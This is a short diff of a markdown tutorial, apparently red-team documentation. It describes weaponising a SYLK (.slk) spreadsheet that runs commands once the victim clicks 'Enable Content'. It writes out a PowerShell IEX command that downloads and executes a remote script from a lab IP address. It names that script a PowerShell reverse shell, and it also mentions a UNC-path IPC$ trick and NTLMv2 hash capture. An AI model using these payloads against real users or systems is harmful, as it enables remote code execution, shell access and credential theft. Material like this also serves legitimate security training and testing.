@@ -58,11 +58,13 @@ Once the file.slk is opened the user will need to click on `Enable Content`. Onc
 1. Change the `cmd.exe /c \\IP\IPC$` to 
 
 ````
-powershell IEX 
+	powershell IEX 
 	(New-Object Net.WebClient).DownloadString(
 	'http://192.168.56.101/test.ps1')
 ````
 2. set up `test.ps1` on a server. 
 test.ps1 is a [powershell reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
+
+![](excel_NTLMv2_hash_reverse.gif)
 
 More on [Symbolic Link](https://en.wikipedia.org/wiki/SYmbolic_LinK_(SYLK)) files
